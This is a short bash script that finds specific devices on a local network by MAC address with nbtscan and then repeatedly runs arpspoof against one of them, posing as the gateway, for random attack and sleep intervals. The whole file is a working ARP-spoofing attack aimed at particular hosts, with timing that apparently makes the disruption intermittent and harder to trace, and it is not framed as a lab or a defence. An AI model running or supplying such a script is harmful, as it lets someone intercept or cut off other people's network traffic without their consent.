#!/bin/bash

target=`nbtscan -q 192.168.1.0/24 | grep e0:d5:5e:fb:af:f7 | awk -F " " '{print $1}'`
target1=`nbtscan -q 192.168.1.0/24 | grep ac:9e:17:b8:bf:ef | awk -F " " '{print $1}'`
target2=`nbtscan -q 192.168.1.0/24 | grep d8-32-e3-0a-7a-a2 | awk -F " " '{print $1}'`
target3=`nbtscan -q 192.168.1.0/24 | grep f4:5c:89:c5:27:eb | awk -F " " '{print $1}'`

gateway=192.168.1.1

attack_time=`shuf -i 120-400 -n 1`

sleep_time=`shuf -i 600-900 -n 1`

dice=3

color_prefix="\033[33m"

color_end="\033[0m"

function attack(){
	for ((i=0;i<${1};i++));
	do
		/usr/bin/timeout ${2} arpspoof -i eth0 -t ${3} ${4}
        sleeptime=${5}
        while [ ${sleeptime} -gt 0 ];do
            echo -ne "Please wait ${color_prefix} ${sleeptime} ${color_end} seconds for next attack..."
            sleep 1
            sleeptime=$((${sleeptime} - 1))
            echo -ne "\r      \r"
        done
	done
}

echo Target:${target}
echo AttackTime:${attack_time}
echo SleepTime:${sleep_time}
echo DICE:${dice}

attack ${dice} ${attack_time} ${target} ${gateway} ${sleep_time}
